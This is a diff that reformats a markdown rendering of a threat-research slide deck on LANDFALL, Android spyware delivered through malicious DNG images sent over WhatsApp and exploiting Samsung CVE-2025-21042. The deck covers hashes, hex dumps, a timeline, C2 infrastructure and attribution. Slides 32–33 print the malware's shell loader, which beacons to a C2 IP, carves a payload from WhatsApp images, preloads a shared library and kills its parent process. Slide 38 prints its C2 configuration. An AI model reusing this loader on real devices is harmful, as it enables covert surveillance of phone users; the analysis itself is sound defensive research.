@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 85.7
 ocr_unreliable_blocks: 0
+vision_verified_pages_changed: 36
+vision_verified_pages: 54
 vision_verified_blocks: 6
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
@@ -58,24 +60,26 @@ AUGUST 2025
 
 ## Slide 6
 
-**Apple Patches CVE-2025-43300** **Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks**
-
-
-> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
 The Hacker News
-Apple Patches CVE-2025-43300 Zero-Day in iOS,
-iPadOS, and macOS Exploited in Targeted Attacks
-WhatsApp Zero-Day Exploited in
-Attacks Targeting Apple Users
-The vulnerability (CVE-2025-55177) was exploited along an iOS/macOS
-zero-day in suspected spyware attacks.
-```
+
+Apple Patches CVE-2025-43300 Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks
+
+WhatsApp Zero-Day Exploited in Attacks Targeting Apple Users
+
+The vulnerability (CVE-2025-55177) was exploited along an iOS/macOS zero-day in suspected spyware attacks.
 
 ## Slide 7
 
-**Apple Patches CVE-2025-43300** **Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks No IoCs, no public samples**
+The Hacker News
+
+Apple Patches CVE-2025-43300 Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks
+
+WhatsApp Zero-Day Exploited in Attacks Targeting Apple Users
+
+The vulnerability (CVE-2025-55177) was exploited along an iOS/macOS zero-day in suspected spyware attacks.
+
+**No IoCs,
+no public samples**
 
 ## Slide 8
 
@@ -89,18 +93,15 @@ TIFF-based image file format
 
 ## Slide 10
 
-## **D** IGITAL
-
-**N** E **G** ATIVE **OPCODES**
+## **D** IGITAL **N** E **G** ATIVE **OPCODES**
 
 **3 Opcode Lists**
 
-**Designed for things like lens correction Turing Complete**
+**Designed for things like lens correction**
+
+**Turing Complete**
 
 ## Slide 11
-
-
-> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 Matches - 6/~6 Files (i)                                                              First seen
@@ -132,9 +133,6 @@ b45817ffb0355badcc89f2d7d48eecf00ebdf2b966ac986514f9d971f6c57d18
 
 ## Slide 12
 
-
-> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 69/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
 ```text
 Matches - 6/~6 Files (i)                                                              First seen
 
@@ -161,68 +159,105 @@ b45817ffb0355badcc89f2d7d48eecf00ebdf2b966ac986514f9d971f6c57d18
 29882a3c426273a7302e852aa77662e168b6d44dcebfca53757e29a9cdf02483
   IMG-20240723-WA0001.jpg                                                             2024-07-23
   tiff                                                                                10:05:57
-
-[The "First seen" column is highlighted with a yellow box and a hand-drawn yellow arrow pointing to it; the rest of the panel is dimmed.]
 ```
+
+*The "First seen" column is boxed in yellow with a hand-drawn arrow pointing to it; the rest of the panel is dimmed.*
 
 ## Slide 13
 
-|Iran
-**Uploaded from**|
-|---|
-|Iraq|
-|Turkey|
-|Morocco
-. . .
-.|
+**Uploaded from**
 
+Iran
 
-> Recovered by OCR — confidence 85/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Iraq
 
-```text
-Uploaded from
-Image 2025-02-10 at 4.54.17 PM.jpeg
-9ac5c2b3379306d4e50b9610e9bba3e56de7d fd3927a96032d
-68ad-4bdd-9F63-4a8ec371596a. jpeg
-Image 2024-08-27 at 11.48.40 AM. jpeg
-0723-WAQ000. jpg
-```
+Turkey
+
+Morocco
+
+...
 
 ## Slide 14
 
-WhatsApp
+Matches - 6/~6 Files
 
-WhatsApp
+9297888746158e38d320b05b27b0032b2cc29231be8990d87b…
+**WhatsApp** Image 2025-02-10 at 4.54.17 PM.jpeg
+tiff
 
-WA
+c0f30c2a2d6f95b57128e78dc0b7180e69315057e62809de19…
+**WhatsApp** Image 2024-08-27 at 11.48.40 AM.jpeg
+tiff
 
-WA
+b06dec10e8ad0005ebb9da24204c96cb2e297bd8d418bc1c89…
+IMG-20250120-**WA**0005.jpg
+tiff
 
-
-> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Matches - 6/~6 Files @
-9297888746158e38d320b05b27b0032b2cc29231be8990d87H
-© WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg
-© WhatsApp Image 2024-08-27 at 11.48.40 AM.jpeg
-© IMG-20240723-WA0000. jpg
-```
+b45817ffb0355badcc89f2d7d48eecf00ebdf2b966ac986514…
+IMG-20240723-**WA**0000.jpg
+tiff
 
 ## Slide 15
 
-###### Legitimate TIFF header
+**Legitimate TIFF header** (annotates the first row, `49 49 2A 00 ...` / `II*`)
 
-Timestamp
+**Timestamp** (annotates `2024:07:23 09:54:00`)
+
+```text
+00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F  ASCII
+
+49 49 2A 00 08 00 00 00  18 00 FE 00 04 00 01 00  II*.............
+00 00 01 00 00 00 00 01  04 00 01 00 00 00 01 00  ................
+00 00 01 01 04 00 01 00  00 00 01 00 00 00 02 01  ................
+03 00 01 00 00 00 08 00  00 00 03 01 03 00 01 00  ................
+00 00 01 00 00 00 06 01  03 00 01 00 00 00 01 00  ................
+00 00 0E 01 02 00 15 00  00 00 2E 01 00 00 0F 01  ................
+02 00 06 00 00 00 44 01  00 00 10 01 02 00 17 00  ......D.........
+00 00 4A 01 00 00 11 01  04 00 01 00 00 00 D4 66  ..J............f
+54 00 12 01 03 00 01 00  00 00 01 00 00 00 15 01  T...............
+03 00 01 00 00 00 01 00  00 00 16 01 04 00 01 00  ................
+00 00 01 00 00 00 17 01  04 00 01 00 00 00 01 00  ................
+00 00 1A 01 05 00 01 00  00 00 62 01 00 00 1B 01  ..........b.....
+05 00 01 00 00 00 6A 01  00 00 28 01 03 00 01 00  ......j...(.....
+00 00 01 00 00 00 32 01  02 00 14 00 00 00 72 01  ......2.......r.
+00 00 4A 01 04 00 02 00  00 00 86 01 00 00 69 87  ..J...........i.
+04 00 01 00 00 00 66 66  54 00 12 C6 01 00 04 00  ......ffT.......
+00 00 01 04 00 00 13 C6  01 00 04 00 00 00 01 02  ................
+00 00 14 C6 02 00 0A 00  00 00 8E 01 00 00 21 C6  ..............!.
+0A 00 09 00 00 00 98 01  00 00 00 00 00 00 7B 22  ..............{"
+73 68 61 70 65 22 3A 20  5B 31 2C 20 31 2C 20 31  shape": [1, 1, 1
+5D 7D 00 00 43 61 6E 6F  6E 00 43 61 6E 6F 6E 20  ]}..Canon.Canon 
+45 4F 53 20 33 35 30 44  20 44 49 47 49 54 41 4C  EOS 350D DIGITAL
+00 00 01 00 00 00 01 00  00 00 01 00 00 00 01 00  ................
+00 00 32 30 32 34 3A 30  37 3A 32 33 20 30 39 3A  ..2024:07:23 09:
+35 34 3A 30 30 00 E0 01  00 00 96 65 54 00 53 6F  54:00......eT.So
+6E 79 20 46 38 32 38 00  01 00 00 00 01 00 00 00  ny F828.........
+00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+```
 
 ## Slide 16
 
+```text
+00547FD0:  00 00 00 00 00 00 FB 00  43 41 46 45 42 41 42 45  ........CAFEBABE
+00547FE0:  50 4B 03 04 14 00 00 00  08 00 41 4A F5 58 C5 4E  PK........AJ.X.N
+00547FF0:  81 66 ED 33 05 00 84 33  05 00 27 00 00 00 64 61  .f.3...3..'...da
+00548000:  74 61 2F 64 61 74 61 2F  63 6F 6D 2E 73 61 6D 73  ta/data/com.sams
+00548010:  75 6E 67 2E 69 70 73 65  72 76 69 63 65 2F 66 69  ung.ipservice/fi
+00548020:  6C 65 73 2F 6C 00 0D 40  F2 BF FD 37 7A 58 5A 00  les/l..@...7zXZ.
+00548030:  00 00 FF 12 D9 41 02 00  21 01 16 00 00 00 74 2F  .....A..!.....t/
+00548040:  E5 A3 E2 C8 EC EF FE 5D  00 3F 91 45 84 68 3D 89  .......].?.E.h=.
+00548050:  A6 DA 8A E1 86 22 A2 D8  4A 53 8E 10 06 CF 09 CF  ....."..JS......
+00548060:  F8 61 26 A0 2C F9 64 E0  3D 7D 96 C5 5D 17 A5 4E  .a&.,.d.=}..]..N
+00548070:  54 06 01 D3 A2 A0 AB 6F  E6 DF 29 F8 6E BE 51 05  T......o..).n.Q.
+```
+
+*The ZIP local-file-header signature `50 4B 03 04 14` (`PK`) and the path bytes `com.samsung.ipservice` are highlighted; the ASCII column reveals `CAFEBABE`, the path `/data/data/com.samsung.ipservice/files/l`, and the `7zXZ` (XZ) magic.*
+
 ## Slide 17
 
-data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .ipservice/files/ **b.so**
+data/data/com.**samsung**.ipservice/files/**l**
 
-
-> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 85/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
+data/data/com.**samsung**.ipservice/files/**b.so**
 
 ```text
 005A7210:  33 05 00 84 33 05 00 27   00 00 00 00 00 00 00 00  3...3..'........
@@ -235,11 +270,7 @@ data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .i
 005A7280:  74 61 2F 64 61 74 61 2F   63 6F 6D 2E 73 61 6D 73  ta/data/com.sams
 005A7290:  75 6E 67 2E 69 70 73 65   72 76 69 63 65 2F 66 69  ung.ipservice/fi
 005A72A0:  6C 65 73 2F 62 2E 73 6F   50 4B 05 06 00 00 00 00  les/b.soPK......
-005A72B0:  02 00 02 00 AD 00 00 00   1B F2 05 00 00 00        ..............
-
-data/data/com.samsung.ipservice/files/l
-
-data/data/com.samsung.ipservice/files/b.so
+005A72B0:  02 00 02 00 AD 00 00 00   1B F2 05 00 00 00  ..............
 ```
 
 ## Slide 18
@@ -248,18 +279,21 @@ wait - Samsung?
 
 ## Slide 19
 
-! Yes, Samsung
+Yes, **Samsung!**
 
 $ **file** b.so .l
 
-**b.so** : ELF 64-bit LSB shared object, **ARM aarch64 l** : **XZ** compressed data (ELF 64-bit, too)
+**b.so** : ELF 64-bit LSB shared object, **ARM aarch64**
+
+**l** : **XZ** compressed data (ELF 64-bit, too)
 
 ## Slide 20
 
 EXPECTATIONS…
 
-REALITY…. Hello,
-Android!
+REALITY….
+
+Hello, Android!
 
 ## Slide 21
 
@@ -277,12 +311,6 @@ Android!
 
 **WhatsApp** **downloads** media there.
 
-###### **01 / RECEIVE**
-
-###### **02 / INDEX**
-
-###### **03 / EXPOSE**
-
 **WhatsApp App** WhatsApp receives and downloads an image file, saving it to the device storage.
 
 **Android OS** The downloaded image is inserted into Android's system-wide MediaStore.
@@ -295,11 +323,19 @@ libimagecodec. quram. so
 
 ## Slide 24
 
-Code which processes **untrustworthy inputs** DO NOT! Code Code written which in an runs with **unsafe no language sandbox** GOOGLE’s RULE OF 2
+Code which processes **untrustworthy inputs**
+
+Code written in an **unsafe language**
+
+Code which runs with **no sandbox**
+
+DO NOT!
+
+GOOGLE's RULE OF 2
 
 ## Slide 25
 
-CVE-2025 -21042
+CVE-2025-**21042**
 
 ## Slide 26
 
@@ -313,55 +349,53 @@ July, 2024
 
 ##### TIMELINE
 
-First malicious DNG image file appears on VirusTotal
+**July, 2024** — First malicious DNG image file appears on VirusTotal
 
-Sept 25, 2024
-
-Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung
+**Sept 25, 2024** — Vulnerability that would become **CVE-2025-21042** was privately reported to Samsung
 
 ## Slide 28
 
 ##### TIMELINE
 
-First malicious DNG image file appears on VirusTotal
+**July, 2024** — First malicious DNG image file appears on VirusTotal
 
-Sept 25, 2024
+**Sept 25, 2024** — Vulnerability that would become **CVE-2025-21042** was privately reported to Samsung
 
-Samsung issues firmware update to address vulnerability that would become CVE-2025-21042
-
-Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung
-
-April, 2025
+**April, 2025** — Samsung issues firmware update to address vulnerability that would become CVE-2025-21042
 
 ## Slide 29
 
 ##### TIMELINE
 
-First malicious DNG image file appears on VirusTotal Sept 25, 2024 Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung
+**July, 2024** — First malicious DNG image file appears on VirusTotal
 
-Samsung issues firmware update to address vulnerability that would become CVE-2025-21042 August, 2025 ● Apple patches DNG vulnerability April, 2025 ● WhatsApp discloses chained exploit ● WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**
+**Sept 25, 2024** — Vulnerability that would become **CVE-2025-21042** was privately reported to Samsung
+
+**April, 2025** — Samsung issues firmware update to address vulnerability that would become CVE-2025-21042
+
+**August, 2025**
+
+- Apple patches DNG vulnerability
+- WhatsApp discloses chained exploit
+- WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**
 
 ## Slide 30
 
 ##### TIMELINE
 
-First malicious DNG image file appears on VirusTotal
+**July, 2024** — First malicious DNG image file appears on VirusTotal
 
-Sept 25, 2024
+**Sept 25, 2024** — Vulnerability that would become **CVE-2025-21042** was privately reported to Samsung
 
-Samsung issues firmware update to address vulnerability that would become CVE-2025-21042
+**April, 2025** — Samsung issues firmware update to address vulnerability that would become CVE-2025-21042
 
-August, 2025
-
-Samsung issues firmware update to address CVE-2025-21043 and discloses CVE-2025-21042
-
-Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung
+**August, 2025**
 
 - Apple patches DNG vulnerability
+- WhatsApp discloses chained exploit
+- WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**
 
-- April, 2025 Sept, 2025 ● WhatsApp discloses chained exploit
-
-- ● WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**
+**Sept, 2025** — Samsung issues firmware update to address CVE-2025-21043 and discloses CVE-2025-21042
 
 ## Slide 31
 
@@ -369,31 +403,41 @@ Vulnerability that July, 2024 would become **CVE-2025-21042** was privately repo
 
 ## Slide 32
 
-**/system/bin/sh -c 'ping -c 1 -w1 -p 2066c1d8ce2834f1fbb1296f9dca73419 91.132.92.35 >/dev/null & '; pid=`cat /proc/self/stat | cut -F 4` && ppid=`cat /proc/$pid/stat | cut -F 4`; rm -f /data/data/com.samsung.ipservice/files/b.so;**
-
-**rm -f /data/data/com.samsung.ipservice/files/z.zip; image=`find /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/ /storage/emulated/95/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/**
-
-**/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1000/Media/WhatsApp Images/ [...]**
-
-**/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1010/Media/WhatsApp Images/ -type f -atime -720m -maxdepth 1 -exec grep -lo '.*066c1d8ce2834f1fbb1296f9dca73419.*' {} \; -quit 2>/dev/null` ; /system/bin/sh -c 'ping -c 1 -w1 -p $(test "$image" && echo 31066c1d8ce2834f1fbb1296f9dca73419 || echo 30066c1d8ce2834f1fbb1296f9dca73419) 91.132.92.35 >/dev/null & ' ;**
-
-**tail -c $(( 390245 )) "$image" > /data/data/com.samsung.ipservice/files/z.zip && unzip -o -d / /data/data/com.samsung.ipservice/files/z.zip && chmod +x /data/data/com.samsung.ipservice/files/b.so; R=I SEP=CAFEBABE LD_PRELOAD=/data/data/com.samsung.ipservice/files/b.so /system/bin/id; content write --uri "content://com.samsung.cmh/files?service_flag=update%20files SET serviceflag= serviceflag | 66304";**
-
-**kill -9 $ppid**
+```text
+/system/bin/sh -c 'ping -c 1 -w1 -p 2066c1d8ce2834f1fbb1296f9dca73419 91.132.92.35 >/dev/null & ';
+pid=`cat /proc/self/stat | cut -F 4` && ppid=`cat /proc/$pid/stat | cut -F 4`;
+rm -f /data/data/com.samsung.ipservice/files/b.so;
+rm -f /data/data/com.samsung.ipservice/files/z.zip;
+image=`find /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/
+/storage/emulated/95/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/
+/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1000/Media/WhatsApp Images/
+[...]
+/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1010/Media/WhatsApp Images/ -type f -atime
+-720m -maxdepth 1 -exec grep -lo '.*066c1d8ce2834f1fbb1296f9dca73419.*' {} \; -quit 2>/dev/null` ;
+/system/bin/sh -c 'ping -c 1 -w1 -p $(test "$image" && echo 31066c1d8ce2834f1fbb1296f9dca73419 || echo
+30066c1d8ce2834f1fbb1296f9dca73419) 91.132.92.35 >/dev/null & ' ;
+tail -c $(( 390245 )) "$image" > /data/data/com.samsung.ipservice/files/z.zip && unzip -o -d /
+/data/data/com.samsung.ipservice/files/z.zip && chmod +x /data/data/com.samsung.ipservice/files/b.so;
+R=I SEP=CAFEBABE LD_PRELOAD=/data/data/com.samsung.ipservice/files/b.so /system/bin/id;
+content write --uri "content://com.samsung.cmh/files?service_flag=update%20files SET serviceflag=
+serviceflag | 66304";
+kill -9 $ppid
+```
 
 ## Slide 33
 
-**/system/bin/sh -c 'ping -c 1 91.132.92.35 >/dev/null & '**
-
+```text
+/system/bin/sh -c 'ping -c 1 91.132.92.35 >/dev/null & '
 [...]
-
-**rm -f** /data/data/com.samsung.ipservice/files/ **b.so**
-
-**rm -f** /data/data/com.samsung.ipservice/files/ **z.zip** [...]
-
-**find** /storage/emulated/0/Android/media / **com.whatsapp** / **WhatsApp/Media/WhatsApp Images** / [...]
-
-**unzip -o -d** / /data/data/com.samsung.ipservice/files/ **z.zip chmod** +x /data/data/com.samsung.ipservice/files/ **b.so R** =I **SEP** = **CAFEBABE LD_PRELOAD** =/data/data/com.samsung.ipservice/files/ **b.so** /system/bin/id
+rm -f /data/data/com.samsung.ipservice/files/b.so
+rm -f /data/data/com.samsung.ipservice/files/z.zip
+[...]
+find /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/
+[...]
+unzip -o -d / /data/data/com.samsung.ipservice/files/z.zip
+chmod +x /data/data/com.samsung.ipservice/files/b.so
+R=I SEP=CAFEBABE LD_PRELOAD=/data/data/com.samsung.ipservice/files/b.so /system/bin/id
+```
 
 ## Slide 34
 
@@ -401,10 +445,9 @@ INSIDE LANDFALL*
 
 ## Slide 35
 
-data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .ipservice/files/ **b.so**
+data/data/com.**samsung**.ipservice/files/**l**
 
-
-> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 85/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
+data/data/com.**samsung**.ipservice/files/**b.so**
 
 ```text
 005A7210:  33 05 00 84 33 05 00 27   00 00 00 00 00 00 00 00  3...3..'........
@@ -417,17 +460,10 @@ data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .i
 005A7280:  74 61 2F 64 61 74 61 2F   63 6F 6D 2E 73 61 6D 73  ta/data/com.sams
 005A7290:  75 6E 67 2E 69 70 73 65   72 76 69 63 65 2F 66 69  ung.ipservice/fi
 005A72A0:  6C 65 73 2F 62 2E 73 6F   50 4B 05 06 00 00 00 00  les/b.soPK......
-005A72B0:  02 00 02 00 AD 00 00 00   1B F2 05 00 00 00        ..............
-
-data/data/com.samsung.ipservice/files/l
-
-data/data/com.samsung.ipservice/files/b.so
+005A72B0:  02 00 02 00 AD 00 00 00   1B F2 05 00 00 00  ..............
 ```
 
 ## Slide 36
-
-
-> Read by a vision model from the page image (replacing unreliable OCR) — confidence 91/100 on the text kept, 92/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 00013920:  00 70 65 72 73 69 73 74   65 6E 63 79 5F 62 61  .persistency_ba
@@ -441,17 +477,14 @@ data/data/com.samsung.ipservice/files/b.so
 00013998:  73 69 6F 6E 5F 6D 61 6A   6F 72 00 70 75 62 6C  sion_major.publ
 000139A7:  69 63 5F 6B 65 79 00 26   69 6E 63 72 65 6D 65  ic_key.&increme
 000139B6:  6E 74 61 6C 5F 62 75 69   6C 64 3D 00 26 65 75  ntal_build=.&eu
-
-[The bytes 62 72 69 64 67 65 5F 68 65 61 64 / "bridge_head" are highlighted in blue on row 0001396B and in green on row 00013989.]
 ```
+
+*The bytes `62 72 69 64 67 65 5F 68 65 61 64` ("bridge_head") are highlighted in blue on row 0001396B and in green on row 00013989.*
 
 ## Slide 37
 
 **BRIDGE HEAD**
 
-
-> Read by a vision model from the page image (replacing unreliable OCR) — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
 ```text
 00013920:  00 70 65 72 73 69 73 74   65 6E 63 79 5F 62 61  .persistency_ba
 0001392F:  63 6B 75 70 00 70 65 72   73 69 73 74 65 6E 63  ckup.persistenc
@@ -464,73 +497,77 @@ data/data/com.samsung.ipservice/files/b.so
 00013998:  73 69 6F 6E 5F 6D 61 6A   6F 72 00 70 75 62 6C  sion_major.publ
 000139A7:  69 63 5F 6B 65 79 00 26   69 6E 63 72 65 6D 65  ic_key.&increme
 000139B6:  6E 74 61 6C 5F 62 75 69   6C 64 3D 00 26 65 75  ntal_build=.&eu
-
-BRIDGE HEAD
-
-[Same hex dump as the previous slide, dimmed, with a large yellow callout banner reading "BRIDGE HEAD" overlaid across rows 0001395C-0001397A. The bytes 62 72 69 64 67 65 5F 68 65 61 64 / "bridge_head" are highlighted in blue on row 0001396B and in green on row 00013989.]
 ```
+
+*A large yellow "BRIDGE HEAD" callout banner is overlaid across the middle of the (dimmed) dump; the bytes `62 72 69 64 67 65 5F 68 65 61 64` ("bridge_head") are highlighted in blue on row 0001396B and in green on row 00013989.*
 
 ## Slide 38
 
-{
-
 ### CONFIGURATION
 
-"cnc_hostname":  " **91.132.92.35** ",
-
-"cnc_port":  22398,
-
-"cnc_base_url":  "is/",
-
-"agent_id":  "066c1d8c-e283-4f1f-bb12-96f9dca73419",
-
-"command_id":  "4317c7e3-2898-4886-aa9c-935c0ac328fa",
-
-"sleep_time":  1,
-
-- "sepolicy_zipped_device_path":  "/data/data/com. **samsung** .ipservice/files/ **l** ", "sepolicy_device_path":  "/data/data/com. **samsung** .ipservice/files/ **l.so** ",
-
-- "sepolicy_magic":  " **CAFEBABE** "
-
+```json
+{
+  "cnc_hostname": "91.132.92.35",
+  "cnc_port": 22398,
+  "cnc_base_url": "is/",
+  "agent_id": "066c1d8c-e283-4f1f-bb12-96f9dca73419",
+  "command_id": "4317c7e3-2898-4886-aa9c-935c0ac328fa",
+  "sleep_time": 1,
+  "sepolicy_zipped_device_path": "/data/data/com.samsung.ipservice/files/l",
+  "sepolicy_device_path": "/data/data/com.samsung.ipservice/files/l.so",
+  "sepolicy_magic": "CAFEBABE"
 }
+```
 
 ## Slide 39
 
 ### CAPABILITIES*
 
-microphone recording location tracking browser database extraction
-
-microphone recording calls recording & camera access interception location tracking SMS & contacts whatsapp images browser database applications images exfiltration extraction arbitrary file anti analysis read & write
+- microphone recording
+- calls recording & interception
+- camera access
+- location tracking
+- SMS & contacts
+- whatsapp images
+- browser database extraction
+- applications
+- images exfiltration
+- arbitrary file read & write
+- anti analysis
 
 ## Slide 40
 
 ###### **C2 Addresses Extracted from LANDFALL Configs**
 
-|C2 IP|Port|Agent ID|Cert|Valid|
-|---|---|---|---|---|
-|45.155.250[.]158|22387|176eb95f-5683-4228-8869-141a227b5aad|2024-04|→2025-04|
-|92.243.65[.]240|22387|e47a0f01-54b4-407f-8263-8078748cf913|2024-07|→2025-07|
-|46.246.28[.]75|22387|b8e5fa71-289d-408a-b2ad-60c4b090d653|2024-12|→2025-12|
-|91.132.92[.]35|22398|066c1d8c-e283-4f1f-bb12-96f9dca73419|2025-01|→2026-01|
+|C2 IP|Port|Agent ID|Cert Valid|
+|---|---|---|---|
+|45.155.250[.]158|22387|176eb95f-5683-4228-8869-141a227b5aad|2024-04 → 2025-04|
+|92.243.65[.]240|22387|e47a0f01-54b4-407f-8263-8078748cf913|2024-07 → 2025-07|
+|46.246.28[.]75|22387|b8e5fa71-289d-408a-b2ad-60c4b090d653|2024-12 → 2025-12|
+|91.132.92[.]35|22398|066c1d8c-e283-4f1f-bb12-96f9dca73419|2025-01 → 2026-01|
 
 ## Slide 41
 
 ###### **C2 Addresses Extracted from LANDFALL Configs**
 
-C2 IP Port Agent ID Cert Valid
-45.155.250[.]158 22387 176eb95f-5683-4228-8869-141a227b5aad 2024-04 → 2025-04
-92.243.65[.]240 22387 Cluster e47a0f01-54b4-407f-8263-8078748cf913 A 2024-07 → 2025-07
-46.246.28[.]75 22387 b8e5fa71-289d-408a-b2ad-60c4b090d653 2024-12 → 2025-12
-91.132.92[.]35 22398 066c1d8c-e283-4f1f-bb12-96f9dca73419 2025-01 → 2026-01
+**Cluster A**
+
+|C2 IP|Port|Agent ID|Cert Valid|
+|---|---|---|---|
+|45.155.250[.]158|22387|176eb95f-5683-4228-8869-141a227b5aad|2024-04 → 2025-04|
+|92.243.65[.]240|22387|e47a0f01-54b4-407f-8263-8078748cf913|2024-07 → 2025-07|
+|46.246.28[.]75|22387|b8e5fa71-289d-408a-b2ad-60c4b090d653|2024-12 → 2025-12|
+|91.132.92[.]35|22398|066c1d8c-e283-4f1f-bb12-96f9dca73419|2025-01 → 2026-01|
 
 ## Slide 42
 
 ###### **Two Infrastructure Clusters**
 
-||**Cluster A**|
+**Cluster A**
+
+| | |
 |---|---|
-|PORTS|22387, 22397, 22398, 5323, ~10900,
-~24000|
+|PORTS|22387, 22397, 22398, 5323, ~10900, ~24000|
 |SERVER|Nginx (various versions)|
 |TLS|Self-signed OpenSSL defaults|
 |RESPONSE|404 / 405 / 500 as control signals|
@@ -539,7 +576,14 @@ C2 IP Port Agent ID Cert Valid
 
 ###### **Two Infrastructure Clusters**
 
-**Cluster A** PORTS 22387, 22397, 22398, 5323, ~10900, ~24000 SERVER Nginx (various versions) TLS Self-signed OpenSSL defaults RESPONSE 404 / 405 / 500 as control signals
+**Cluster A**
+
+| | |
+|---|---|
+|PORTS|22387, 22397, 22398, 5323, ~10900, ~24000|
+|SERVER|Nginx (various versions)|
+|TLS|Self-signed OpenSSL defaults|
+|RESPONSE|404 / 405 / 500 as control signals|
 
 Those domains resolve to different servers — a **second layer** of infrastructure.
 
@@ -547,21 +591,25 @@ Those domains resolve to different servers — a **second layer** of infrastruct
 
 ###### **Two Infrastructure Clusters**
 
-||**Cluster A**||**Cluster B**|
-|---|---|---|---|
-|PORTS
-SERVER
-TLS|22387, 22397, 22398, 5323, ~10900,
-~24000
-Nginx (various versions)
-Self-signed OpenSSL defaults|PORTS
-SERVER
-TLS|443 (standard HTTPS)
-Nginx 1.18.0 (Ubuntu)
-Let's Encrypt certificates|
-|RESPONSE|404 / 405 / 500 as control signals|COVER|WordPress sites w/ generic content|
-|||REGISTRAR|Namecheap (all domains)|
-|||NAMING|Multi-word English (2-3 words)|
+**Cluster A**
+
+| | |
+|---|---|
+|PORTS|22387, 22397, 22398, 5323, ~10900, ~24000|
+|SERVER|Nginx (various versions)|
+|TLS|Self-signed OpenSSL defaults|
+|RESPONSE|404 / 405 / 500 as control signals|
+
+**Cluster B**
+
+| | |
+|---|---|
+|PORTS|443 (standard HTTPS)|
+|SERVER|Nginx 1.18.0 (Ubuntu)|
+|TLS|Let's Encrypt certificates|
+|COVER|WordPress sites w/ generic content|
+|REGISTRAR|Namecheap (all domains)|
+|NAMING|Multi-word English (2-3 words)|
 
 ## Slide 45
 
@@ -575,9 +623,11 @@ ATTRIBUTION*
 
 ## Slide 47
 
-**Stealth Falcon** TGR-UNK-1069
+**Stealth Falcon**
 
-Targets governments, f i nancial institutions, and telecom organizations across the Middle East and North Africa.
+TGR-UNK-1069
+
+Targets governments, financial institutions, and telecom organizations across the Middle East and North Africa.
 
 ## Slide 48
 
@@ -587,13 +637,20 @@ Targets governments, f i nancial institutions, and telecom organizations across 
 
 #### The Problem
 
-###### **The Fingerprint**
+**The Fingerprint**
 
-Server nginx/1.18.0 (Ubuntu) Port 443 Certificate Let's Encrypt Content WordPress
+| | |
+|---|---|
+|Server|nginx/1.18.0 (Ubuntu)|
+|Port|443|
+|Certificate|Let's Encrypt|
+|Content|WordPress|
 
 How many servers on the internet match this description?
 
-~ **2,000,000** Among the most common web server configuration on the internet. **Fingerprinting alone is useless** .
+**~2,000,000**
+
+Among the most common web server configuration on the internet. **Fingerprinting alone is useless** .
 
 ## Slide 50
 
@@ -613,9 +670,18 @@ How many servers on the internet match this description?
 #### Differential Scanner Analysis
 
 The actor blocked Scanner A’s and B ‘s IP ranges on their C2 servers.
-They missed Scanner C . That gap is the signal.
-Step 1 Step 2 Step 3 Step 4 Step 5
-Query Scanner C Query Scanner A Subtract Refine Validate
+
+**They missed Scanner C.** That gap is the signal.
+
+**Step 1** Query Scanner C
+
+**Step 2** Query Scanner A
+
+**Step 3** Subtract
+
+**Step 4** Refine
+
+**Step 5** Validate
 
 ## Slide 52
 
@@ -623,20 +689,13 @@ If you have known C2 servers and they're absent from a scanner, that's **not** m
 
 ## Slide 53
 
